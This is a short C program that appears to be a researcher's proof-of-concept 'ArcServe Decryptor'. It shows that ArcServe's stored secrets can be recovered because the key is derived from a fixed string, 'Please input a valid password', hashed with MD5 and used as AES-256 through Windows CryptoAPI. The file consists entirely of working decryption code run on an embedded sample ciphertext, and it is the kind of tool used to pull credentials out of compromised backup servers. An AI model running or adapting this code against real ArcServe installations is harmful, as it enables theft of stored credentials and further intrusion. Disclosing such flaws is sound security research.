#include <Windows.h>
#include <stdio.h>

int main(int argc, char** argv) {
    printf("\t\t-={ ArcServe Decryptor by Juan Manuel Fernandez (@TheXC3LL) }=-\n\n");

    HCRYPTPROV phProv = NULL;
    HCRYPTHASH phHash = NULL;
    HCRYPTKEY phKey = NULL;

    BYTE enc[] = { 133, 60, 97, 192, 158, 159, 25, 141, 58, 250, 174, 169, 141, 216, 104, 98 }; // Encrypted data

    // Key derived from "Please input a valid password" in UTF-16LE byte format
    BYTE key[] = {
        0x50, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x61, 0x00, 0x73, 0x00, 0x65, 0x00, 0x20, 0x00, 0x69, 0x00,
        0x6E, 0x00, 0x70, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x61, 0x00, 0x20, 0x00, 0x76, 0x00,
        0x61, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x64, 0x00, 0x20, 0x00, 0x70, 0x00, 0x61, 0x00, 0x73, 0x00,
        0x73, 0x00, 0x77, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x64, 0x00
    };

    DWORD pdwDataLen = sizeof(enc);

    // Acquire cryptographic provider context
    if (!CryptAcquireContextW(&phProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("[!] CryptAcquireContextW Failed! Error: %u\n", GetLastError());
        exit(-1);
    }

    // Create hash object
    if (!CryptCreateHash(phProv, CALG_MD5, NULL, 0, &phHash)) {
        printf("[!] CryptCreateHash Failed! Error: %u\n", GetLastError());
        exit(-1);
    }

    // Hash the key
    if (!CryptHashData(phHash, key, sizeof(key), 0)) {
        printf("[!] CryptHashData Failed! Error: %u\n", GetLastError());
        exit(-1);
    }

    // Derive the cryptographic key (AES-256)
    if (!CryptDeriveKey(phProv, CALG_AES_256, phHash, 0, &phKey)) {
        printf("[!] CryptDeriveKey Failed! Error: %u\n", GetLastError());
        exit(-1);
    }

    // Decrypt the data
    if (!CryptDecrypt(phKey, NULL, TRUE, 0, enc, &pdwDataLen)) {
        printf("[!] CryptDecrypt Failed! Error: %u\n", GetLastError());
        exit(-1);
    }

    // Print decrypted data
    printf("[+] Decrypted string (UTF-16LE): ");
    for (DWORD i = 0; i < pdwDataLen / sizeof(WCHAR); i++) {
        printf("%lc", *((WCHAR*)enc + i));
    }
    printf("\n");

    // Clean up
    if (phKey) CryptDestroyKey(phKey);
    if (phHash) CryptDestroyHash(phHash);
    if (phProv) CryptReleaseContext(phProv, 0);

    return 0;
}
